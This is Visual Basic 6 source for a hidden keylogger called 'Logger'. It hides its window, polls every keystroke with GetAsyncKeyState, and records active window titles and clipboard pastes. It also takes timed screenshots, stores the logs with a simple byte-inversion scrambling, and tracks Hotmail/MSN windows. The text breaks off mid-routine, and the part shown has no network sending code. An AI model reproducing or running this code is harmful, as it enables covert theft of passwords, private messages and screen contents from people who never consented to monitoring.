VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00C0FFFF&
   Caption         =   "Logger"
   ClientHeight    =   6780
   ClientLeft      =   48
   ClientTop       =   312
   ClientWidth     =   12192
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   6780
   ScaleWidth      =   12192
   StartUpPosition =   3  'Windows Default
   WindowState     =   2  'Maximized
   Begin VB.TextBox Text10 
      Height          =   240
      Left            =   24
      TabIndex        =   28
      Top             =   6276
      Visible         =   0   'False
      Width           =   1824
   End
   Begin VB.PictureBox Picture1 
      BackColor       =   &H00FFFFFF&
      BorderStyle     =   0  'None
      Height          =   372
      Left            =   11472
      Picture         =   "Form1.frx":030A
      ScaleHeight     =   372
      ScaleWidth      =   372
      TabIndex        =   27
      Top             =   5880
      Width           =   372
   End
   Begin VB.FileListBox File1 
      Height          =   264
      Left            =   -12
      Pattern         =   "*.bmp"
      TabIndex        =   18
      Top             =   1248
      Visible         =   0   'False
      Width           =   2640
   End
   Begin VB.TextBox MSN 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   7.8
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   3708
      Left            =   12
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   26
      Top             =   1272
      Visible         =   0   'False
      Width           =   12132
   End
   Begin VB.TextBox Text9 
      Height          =   240
      Left            =   36
      TabIndex        =   24
      Top             =   6540
      Visible         =   0   'False
      Width           =   1812
   End
   Begin VB.TextBox Text8 
      BackColor       =   &H00C0FFFF&
      BorderStyle     =   0  'None
      Height          =   240
      Left            =   3984
      TabIndex        =   22
      Text            =   "10"
      Top             =   648
      Width           =   216
   End
   Begin VB.CheckBox Check3 
      BackColor       =   &H00C0FFFF&
      Caption         =   "Show Logger Message Box Every"
      Height          =   240
      Left            =   1284
      TabIndex        =   21
      Top             =   636
      Width           =   2712
   End
   Begin VB.TextBox Text7 
      Alignment       =   2  'Center
      BackColor       =   &H00C0FFFF&
      BorderStyle     =   0  'None
      Height          =   180
      Left            =   3552
      TabIndex        =   13
      Text            =   "30"
      Top             =   960
      Width           =   204
   End
   Begin VB.TextBox Text6 
      BackColor       =   &H00C0FFFF&
      BorderStyle     =   0  'None
      Height          =   300
      Left            =   5928
      TabIndex        =   10
      Top             =   312
      Visible         =   0   'False
      Width           =   684
   End
   Begin VB.CheckBox Check1 
      BackColor       =   &H00C0FFFF&
      Caption         =   "Auto Hide"
      Height          =   300
      Left            =   960
      TabIndex        =   9
      Top             =   912
      Value           =   1  'Checked
      Width           =   972
   End
   Begin VB.CheckBox Option1 
      BackColor       =   &H00C0FFFF&
      Caption         =   "Enabled"
      Height          =   300
      Left            =   48
      TabIndex        =   8
      Top             =   912
      Value           =   1  'Checked
      Width           =   876
   End
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   480
      Top             =   5760
      _ExtentX        =   677
      _ExtentY        =   677
      _Version        =   393216
   End
   Begin VB.TextBox Text5 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Height          =   252
      Left            =   8592
      Locked          =   -1  'True
      TabIndex        =   6
      Top             =   960
      Width           =   2604
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Browse"
      Height          =   300
      Left            =   11208
      TabIndex        =   5
      Top             =   912
      Width           =   924
   End
   Begin VB.TextBox Text4 
      BackColor       =   &H00C0FFFF&
      BorderStyle     =   0  'None
      Height          =   300
      Left            =   5256
      TabIndex        =   4
      Top             =   312
      Visible         =   0   'False
      Width           =   684
   End
   Begin VB.TextBox Text3 
      BackColor       =   &H00C0FFFF&
      BorderStyle     =   0  'None
      Height          =   300
      Left            =   4584
      TabIndex        =   3
      Top             =   300
      Visible         =   0   'False
      Width           =   684
   End
   Begin VB.TextBox Text2 
      BackColor       =   &H00C0FFFF&
      BorderStyle     =   0  'None
      Height          =   276
      Left            =   3900
      TabIndex        =   2
      Top             =   312
      Visible         =   0   'False
      Width           =   684
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   144
      Top             =   5784
   End
   Begin VB.TextBox Text1 
      BackColor       =   &H00C0FFC0&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   7.8
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   5016
      Left            =   24
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   1248
      Width           =   12156
   End
   Begin VB.CheckBox Check2 
      BackColor       =   &H00C0FFFF&
      Caption         =   "ScreenShot"
      Height          =   204
      Left            =   2016
      TabIndex        =   11
      Top             =   960
      Width           =   1116
   End
   Begin VB.Image Image2 
      Height          =   276
      Index           =   1
      Left            =   48
      Picture         =   "Form1.frx":0614
      Stretch         =   -1  'True
      Top             =   312
      Visible         =   0   'False
      Width           =   264
   End
   Begin VB.Image Image2 
      Height          =   216
      Index           =   0
      Left            =   72
      Picture         =   "Form1.frx":091E
      Stretch         =   -1  'True
      Top             =   360
      Width           =   204
   End
   Begin VB.Label Label10 
      Alignment       =   1  'Right Justify
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      BorderStyle     =   1  'Fixed Single
      Caption         =   "MSN/Hotmail"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   7.8
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   288
      Left            =   24
      TabIndex        =   25
      Top             =   312
      Width           =   1476
   End
   Begin VB.Label Label9 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Minutes"
      Height          =   192
      Left            =   4224
      TabIndex        =   23
      Top             =   660
      Width           =   552
   End
   Begin VB.Label Label8 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Delete"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   7.8
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   240
      Left            =   2472
      TabIndex        =   20
      Top             =   636
      Visible         =   0   'False
      Width           =   996
   End
   Begin VB.Label Label7 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Refresh"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   7.8
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   240
      Left            =   1284
      TabIndex        =   19
      Top             =   636
      Visible         =   0   'False
      Width           =   1164
   End
   Begin VB.Label Label6 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Screen Shots"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   7.8
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   240
      Left            =   0
      TabIndex        =   17
      Top             =   636
      Width           =   1260
   End
   Begin VB.Image Image1 
      Height          =   4788
      Left            =   48
      Stretch         =   -1  'True
      Top             =   1500
      Width           =   12108
   End
   Begin VB.Label Label5 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Clear Logs"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   7.8
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   252
      Left            =   6000
      TabIndex        =   16
      Top             =   960
      Width           =   1272
   End
   Begin VB.Label Command2 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Test Screenshot"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   7.8
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   252
      Left            =   4464
      TabIndex        =   15
      Top             =   960
      Width           =   1524
   End
   Begin VB.Label Label4 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Minutes"
      Height          =   192
      Left            =   3792
      TabIndex        =   14
      Top             =   960
      Width           =   552
   End
   Begin VB.Label Label3 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Every"
      Height          =   192
      Left            =   3120
      TabIndex        =   12
      Top             =   960
      Width           =   420
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Save To :"
      Height          =   192
      Left            =   7872
      TabIndex        =   7
      Top             =   972
      Width           =   696
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "Project1 - [Microsoft Visual Basic [disign] - [Project1 - Form1 (Form)]"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   13.8
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   672
      Left            =   0
      TabIndex        =   1
      Top             =   0
      Width           =   10668
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Public FileVisible As Boolean
Public GetAddy As Boolean
Public AddKey As String
Public OldCaption As String
Public oldleft As Long
Public oldtop As Long
Public ScreenShotTimer As Long
Public ShotCount As Long
Public YEs As Boolean
Public Message As String
Public MessageTimer As Long
Public MSNactive As Boolean
Public EmailAddy As String
Private Declare Function Getasynckeystate Lib "user32" Alias "GetAsyncKeyState" (ByVal KeyAscii As Long) As Integer
Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Private Declare Function GetForegroundWindow Lib "user32.dll" () As Long
Private Function FindOppAsc(Value As Integer) As Integer
    If Value <> 128 Then
        FindOppAsc = 255 - Value
    Else
        FindOppAsc = Value
    End If
End Function
Function GetCaption(hWnd As Long)
Dim hWndTitle As String
hWndTitle = String(GetWindowTextLength(hWnd), 0)
GetWindowText hWnd, hWndTitle, (GetWindowTextLength(hWnd) + 1)
GetCaption = hWndTitle
End Function

Private Sub Check3_Click()
If Check3.Value = 1 Then
Message = InputBox("What Message Do You Want To Show Every " & Text8 & " Minutes?", "Set Logger Message")
If Message = "" Then
Check3.Value = 0
MessageTimer = 0
Exit Sub
End If
YesNo = MsgBox("Would You Like To View The Message Before You Allow It To Run?", vbYesNoCancel, "View Message?")
Select Case YesNo
Case vbYes
MsgBox Message, vbSystemModal, "Logger"
YesNo = MsgBox("Run This Message?", vbYesNo, "Run?")
Select Case YesNo
Case vbNo
Check3.Value = 0
End Select
Case vbCancel
Check3.Value = 0
End Select
End If
MessageTimer = 0
End Sub

Private Sub Command1_Click()
On Error Resume Next
CommonDialog1.CancelError = True
CommonDialog1.DialogTitle = "Logger"
CommonDialog1.Filter = "Text Files (*.txt) |  *.txt; | All Files (*.*) | *.*"
CommonDialog1.ShowOpen
Text5.Text = Left(CommonDialog1.FileName, Len(CommonDialog1.FileName) - Len(CommonDialog1.FileTitle))
End Sub

Private Sub Command2_Click()
Dim lngfilepos As Long
Form2.WindowState = vbNormal
MakeTranslucent2 Form2, &H80000005
SavePicture Form2.Image, Text5.Text & "ScreenShot" & ShotCount & ".bmp"
ShotCount = ShotCount + 1
End Sub

Private Sub File1_click()
Image1.Picture = LoadPicture(Text5.Text & File1.FileName)
End Sub

Private Sub Form_Load()
On Error Resume Next
MSNactive = False
Form2.Width = Screen.Width
Form2.Height = Screen.Height
Form2.Top = 0
Form2.Left = 0
Form3.Show
Form1.Visible = False
YEs = False
Text5 = App.Path & "\"
File1.Path = Text5
Open Text5.Text & "Log.txt" For Input As #1
        Text9 = Input(LOF(1), 1)
    Close #1
    Open Text5.Text & "MSN.txt" For Input As #1
        Text10 = Input(LOF(1), 1)
    Close #1
    Text1 = Convert(Text9)
    MSN = Convert(Text10)
    MSN.Text = Mid(MSN.Text, 2, Len(MSN.Text) - 4)
    Text1.Text = Mid(Text1.Text, 2, Len(Text1.Text) - 4)
'Me.Hide
NOSHOW
Timer1.Enabled = True
ScreenShotTimer = 0
ShotCount = 1
End Sub

Private Sub Form_Resize()
On Error Resume Next
Command1.Left = Me.Width - Command1.Width - 100
Text5.Left = Command1.Left - Text5.Width - 50
Label2.Left = Text5.Left - Label2.Width - 25
Text1.Width = Me.Width - 75
Text1.Height = Me.Height - Text1.Top - 400
Label1.Width = Me.Width - 75
Image1.Height = Text1.Height - File1.Height
Image1.Width = Text1.Width
File1.Width = Image1.Width
MSN.Width = Text1.Width
MSN.Height = Text1.Height
Picture1.Top = Text1.Top + Text1.Height - Picture1.Height - 25
Picture1.Left = Text1.Width + Text1.Left - Picture1.Width - 325
End Sub

Private Sub Form_Unload(Cancel As Integer)
Dim xx
If YEs = True Then Exit Sub

xx = MsgBox("Are You Sure You Want To Exit 'Logger?'", vbYesNo, "Logger")
Select Case xx
Case vbYes
Unload Form2
Unload Form3
Case vbNo
Cancel = 1
End Select
End Sub

Private Sub Label10_Click()
Image2(0).Visible = Image2(1).Visible

If Image2(0).Visible = False Then
Image2(1).Visible = True
Else
Image2(1).Visible = False
End If
End Sub


Private Sub Label5_Click()
On Error Resume Next
Select Case Label5.Caption
Case "Clear Logs"
Text1.Text = ""
MSN.Text = ""
Case "Full Screen"
'Form2.WindowState = vbNormal
Form2.Show
Form2.Width = Screen.Width
Form2.Height = Screen.Height
Form2.Left = 0
Form2.Top = 0
Form2.Picture1.Width = Form2.Width
Form2.Picture1.Height = Form2.Height
Form2.Picture1.Picture = LoadPicture(File1.Path & "\" & File1.FileName)
KeepOnTop Form2
End Select
End Sub

Private Sub Label6_Click()
Select Case Label6.Caption
Case "Screen Shots"
File1.Path = Text5.Text
File1.Visible = True
Image1.Visible = True
Text1.Visible = False
File1.Refresh
Label6.Caption = "Log File"
Label7.Visible = True
Label8.Visible = True
Label9.Visible = False
Check3.Visible = False
Text8.Visible = False
Label5.Caption = "Full Screen"
MSN.Visible = False
Image2(0).Visible = True
If Image2(0).Visible = False Then Image2(1).Visible = True Else Image2(1).Visible = False
Exit Sub
Case "Log File"
Image1.Visible = False
File1.Visible = False
Text1.Visible = True
Label6.Caption = "Screen Shots"
Label5.Caption = "Clear Logs"
Label7.Visible = False
Label8.Visible = False
Label9.Visible = True
Check3.Visible = True
Text8.Visible = True
MSN.Visible = False
Image2(0).Visible = True
If Image2(0).Visible = False Then Image2(1).Visible = True Else Image2(1).Visible = False
Exit Sub
End Select
End Sub

Private Sub Label7_Click()
On Error Resume Next
File1.Refresh
Image1.Refresh
End Sub

Private Sub Label8_Click()
DestroyFile File1.Path & "\" & File1.FileName
File1.Refresh
End Sub

Private Sub MSN_Change()
Text10 = Convert(MSN)
End Sub

Private Sub Option1_Click()
Timer1.Enabled = Option1.Value
End Sub

Private Function Convert(cString As String) As String
    For cCode = 1 To Len(cString)
        Convert = Convert + Chr(FindOppAsc(Asc(Mid(cString, CInt(cCode), 1))))
    Next cCode
End Function

Private Sub Text1_Change()
Text9 = Convert(Text1)
End Sub

Private Sub Timer1_Timer()


Select Case Image2(1).Visible
Case True
MSN.Visible = True
Label6.Visible = False
Label7.Visible = False
Label8.Visible = False
Label9.Visible = False
Text8.Visible = False
Check3.Visible = False
File1.Visible = False

Case False
If Text1.Visible = False Then File1.Visible = True Else File1.Visible = False
FileVisible = False
MSN.Visible = False
Label6.Visible = True

Select Case Label6.Caption
Case "Screen Shots"
Label9.Visible = True
Text8.Visible = True
Check3.Visible = True
Case "Log File"
Label9.Visible = False
Text8.Visible = False
Check3.Visible = False
End Select

End Select
'Select Case File1.Visible
'Case True
'Text1.Visible = False
'Label7.Visible = True
'Label8.Visible = True
'Check3.Visible = False
'Label9.Visible = False
'Text8.Visible = False
'Case False
'Label7.Visible = False
'Label8.Visible = False
'Check3.Visible = True
'Label9.Visible = True
'Text8.Visible = True
'End Select
If MSN.Visible = True Then Picture1.Visible = True Else Picture1.Visible = False
If Check2.Value = 1 Then
    ScreenShotTimer = ScreenShotTimer + 1
    If ScreenShotTimer >= Text7.Text * 1000 Then
        Command2_Click
        ScreenShotTimer = 0
    End If
End If
If Check3.Value = 1 Then
    MessageTimer = MessageTimer + 1
    If MessageTimer >= Text8.Text * 1000 Then
    MsgBox Message, vbSystemModal, "Logger Message"
    MessageTimer = 0
    End If
End If

If Me.Visible = False Then Text1.SelStart = Len(Text1.Text)

Open Text5.Text & "Log.txt" For Output As #1
Write #1, Text9
Close #1

Open Text5.Text & "MSN.txt" For Output As #1
Write #1, Text10
Close #1

If GetForegroundWindow <> CurrentApp_hWnd Then
CurrentApp_hWnd = GetForegroundWindow
If GetCaption(GetForegroundWindow) = "" Then
Else:
If GetCaption(GetForegroundWindow) = OldCaption Then GoTo KeyCheck
OldCaption = GetCaption(GetForegroundWindow)
Label1.Caption = OldCaption
AddKey = vbCrLf & " [" & GetCaption(GetForegroundWindow) & "] " & vbCrLf
End If
End If
KeyCheck:
If Getasynckeystate(9) = -32767 Then If AddKey = vbTab Then GoTo Letters Else AddKey = vbTab
If Getasynckeystate(16) = -32767 Then
If Text2 = "<Shift>" Then
GoTo Letters
Else
Text2 = "<Shift>"
End If
End If
If Getasynckeystate(20) = -32767 Then
If Text6 = "<Caps>" Then
Text6 = ""
GoTo Letters
Else
Text6 = "<Caps>"
End If
End If
If Getasynckeystate(17) = -32767 Then
If Text3 = "<Ctrl>" Then
GoTo Letters
Else
Text3 = "<Ctrl>"
End If
End If
If Getasynckeystate(18) = -32767 Then If Text4 = "<Alt>" Then GoTo Letters Else Text4 = "<Alt>"
If Getasynckeystate(46) = -32767 Then If AddKey = "<Del>" Then GoTo Letters Else AddKey = "<Del>"
If Getasynckeystate(8) = -32767 Then
If MSNactive = True Then
MSN = Left(MSN, Len(MSN) - 1)
Else
Text1.Text = Left(Text1.Text, Len(Text1.Text) - 1)
End If
End If
Letters:
If Getasynckeystate(65) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "A"
Text2 = ""
Else:
AddKey = "a"
Text2 = ""
End If
End If
If Getasynckeystate(66) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "B"
Text2 = ""
Else:
AddKey = "b"
Text2 = ""
End If
End If
If Getasynckeystate(67) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "C"
Text2 = ""
Else:
AddKey = "c"
Text2 = ""
End If
End If
If Getasynckeystate(68) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "D"
Text2 = ""
Else:
AddKey = "d"
Text2 = ""
End If
End If
If Getasynckeystate(69) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "E"
Text2 = ""
Else:
AddKey = "e"
Text2 = ""
End If
End If
If Getasynckeystate(70) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "F"
Text2 = ""
Else:
AddKey = "f"
Text2 = ""
End If
End If
If Getasynckeystate(71) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "G"
Text2 = ""
Else:
AddKey = "g"
Text2 = ""
End If
End If
If Getasynckeystate(72) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "H"
Text2 = ""
Else:
AddKey = "h"
Text2 = ""
End If
End If
If Getasynckeystate(73) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "I"
Text2 = ""
Else:
AddKey = "i"
Text2 = ""
End If
End If
If Getasynckeystate(74) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "J"
Text2 = ""
Else:
AddKey = "j"
Text2 = ""
End If
End If
If Getasynckeystate(75) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "K"
Text2 = ""
Else:
AddKey = "k"
Text2 = ""
End If
End If
If Getasynckeystate(76) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "L"
Text2 = ""
Else:
AddKey = "l"
Text2 = ""
End If
End If
If Getasynckeystate(77) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "M"
Text2 = ""
Else:
AddKey = "m"
Text2 = ""
End If
End If
If Getasynckeystate(78) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "N"
Text2 = ""
Else:
AddKey = "n"
Text2 = ""
End If
End If
If Getasynckeystate(79) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "O"
Text2 = ""
Else:
AddKey = "o"
Text2 = ""
End If
End If
If Getasynckeystate(80) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "P"
Text2 = ""
Else:
AddKey = "p"
Text2 = ""
End If
End If
If Getasynckeystate(81) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "Q"
Text2 = ""
Else:
AddKey = "q"
Text2 = ""
End If
End If
If Getasynckeystate(82) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "R"
Text2 = ""
Else:
AddKey = "r"
Text2 = ""
End If
End If
If Getasynckeystate(83) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "S"
Text2 = ""
Else:
AddKey = "s"
Text2 = ""
End If
End If
If Getasynckeystate(84) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "T"
Text2 = ""
Else:
AddKey = "t"
Text2 = ""
End If
End If
If Getasynckeystate(85) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "U"
Text2 = ""
Else:
AddKey = "u"
Text2 = ""
End If
End If
If Getasynckeystate(86) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "V"
Text2 = ""
Else:
AddKey = "v"
Text2 = ""
End If
If Text3 = "<Ctrl>" Then
AddKey = Clipboard.GetText()
End If
Text3 = ""
End If
If Getasynckeystate(87) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "W"
Text2 = ""
Else:
AddKey = "w"
Text2 = ""
End If
End If
If Getasynckeystate(88) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "X"
Text2 = ""
Else:
AddKey = "x"
Text2 = ""
End If
End If
If Getasynckeystate(89) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "Y"
Text2 = ""
Else:
AddKey = "y"
Text2 = ""
End If
End If
If Getasynckeystate(90) = -32767 Then
If Text2 = "<Shift>" Or Text6 = "<Caps>" Then
AddKey = "Z"
Text2 = ""
Else:
AddKey = "z"
Text2 = ""
End If
End If
'Letters End
'Enter, Space, Numbers
If Getasynckeystate(48) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = ")"
Text2 = ""
Else
AddKey = "0"
Text2 = ""
End If
End If
If Getasynckeystate(49) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = "!"
Text2 = ""
Else
AddKey = "1"
Text2 = ""
End If
End If
If Getasynckeystate(50) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = "@"
Text2 = ""
Else
AddKey = "2"
Text2 = ""
End If
End If
If Getasynckeystate(51) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = "#"
Text2 = ""
Else
AddKey = "3"
Text2 = ""
End If
End If
If Getasynckeystate(52) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = "$"
Text2 = ""
Else
AddKey = "4"
Text2 = ""
End If
End If
If Getasynckeystate(53) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = "%"
Text2 = ""
Else
AddKey = "5"
Text2 = ""
End If
End If
If Getasynckeystate(54) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = "^"
Text2 = ""
Else
AddKey = "6"
Text2 = ""
End If
End If
If Getasynckeystate(55) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = "&"
Text2 = ""
Else
AddKey = "7"
Text2 = ""
End If
End If
If Getasynckeystate(56) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = "*"
Text2 = ""
Else
AddKey = "8"
Text2 = ""
End If
End If
If Getasynckeystate(57) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = "("
Text2 = ""
Else
AddKey = "9"
Text2 = ""
End If
End If

If Getasynckeystate(96) = -32767 Then AddKey = "0"
If Getasynckeystate(97) = -32767 Then AddKey = "1"
If Getasynckeystate(98) = -32767 Then AddKey = "2"
If Getasynckeystate(99) = -32767 Then AddKey = "3"
If Getasynckeystate(100) = -32767 Then AddKey = "4"
If Getasynckeystate(101) = -32767 Then AddKey = "5"
If Getasynckeystate(102) = -32767 Then AddKey = "6"
If Getasynckeystate(103) = -32767 Then AddKey = "7"
If Getasynckeystate(104) = -32767 Then AddKey = "8"
If Getasynckeystate(105) = -32767 Then AddKey = "9"
If Getasynckeystate(189) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = "_"
Text2 = ""
Else
AddKey = "-"
Text2 = ""
End If
End If
If Getasynckeystate(187) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = "+"
Text2 = ""
Else
AddKey = "="
Text2 = ""
End If
End If
If Getasynckeystate(220) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = "|"
Text2 = ""
Else
AddKey = "\"
Text2 = ""
End If
End If
If Getasynckeystate(192) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = "~"
Text2 = ""
Else
AddKey = "`"
Text2 = ""
End If
End If
If Getasynckeystate(219) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = "{"
Text2 = ""
Else
AddKey = "["
Text2 = ""
End If
End If
If Getasynckeystate(221) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = "}"
Text2 = ""
Else
AddKey = "]"
Text2 = ""
End If
End If
If Getasynckeystate(186) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = ":"
Text2 = ""
Else
AddKey = ";"
Text2 = ""
End If
End If
If Getasynckeystate(222) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = "'"
Text2 = ""
Else
AddKey = "'"
Text2 = ""
End If
End If
If Getasynckeystate(188) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = "<"
Text2 = ""
Else
AddKey = ","
Text2 = ""
End If
End If
If Getasynckeystate(190) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = ">"
Text2 = ""
Else
AddKey = "."
Text2 = ""
End If
End If
If Getasynckeystate(191) = -32767 Then
If Text2 = "<Shift>" Then
AddKey = "?"
Text2 = ""
Else
AddKey = "/"
Text2 = ""
End If
End If
If Getasynckeystate(91) = -32767 Then AddKey = vbCrLf
If Getasynckeystate(32) = -32767 Then AddKey = " "
If Getasynckeystate(32) = -32767 Then AddKey = " "
If Getasynckeystate(110) = -32767 Then AddKey = "."
If Getasynckeystate(107) = -32767 Then AddKey = "+"
If Getasynckeystate(109) = -32767 Then AddKey = "-"
If Getasynckeystate(106) = -32767 Then AddKey = "*"
If Getasynckeystate(111) = -32767 Then AddKey = "/"
If Getasynckeystate(112) = -32767 Then AddKey = "<F1>"
If Getasynckeystate(113) = -32767 Then AddKey = "<F2>"
If Getasynckeystate(114) = -32767 Then AddKey = "<F3>"
If Getasynckeystate(115) = -32767 Then AddKey = "<F4>"
If Getasynckeystate(116) = -32767 Then AddKey = "<F5>"
If Getasynckeystate(117) = -32767 Then AddKey = "<F6>"
If Getasynckeystate(118) = -32767 Then AddKey = "<F7>"
If Getasynckeystate(119) = -32767 Then AddKey = "<F8>"
If Getasynckeystate(120) = -32767 Then AddKey = "<F9>"
If Getasynckeystate(121) = -32767 Then AddKey = "<F10>"
If Getasynckeystate(122) = -32767 Then AddKey = "<F11>"
If Getasynckeystate(123) = -32767 Then AddKey = "<F12>"
If Getasynckeystate(91) = -32767 Then AddKey = "<Win>"
If Getasynckeystate(37) = -32767 Then AddKey = "<Left>"
If Getasynckeystate(38) = -32767 Then AddKey = "<Up>"
If Getasynckeystate(39) = -32767 Then AddKey = "<Right>"
If Getasynckeystate(40) = -32767 Then AddKey = "<Down>"
If Getasynckeystate(13) = -32767 Then AddKey = vbCrLf
Dim IntLeft As Integer
Dim Active As String
Active = GetCaption(GetForegroundWindow)
IntLeft = 1
Hotmail:
If Mid(Active, IntLeft, 7) = "Hotmail" Then
MSNactive = True
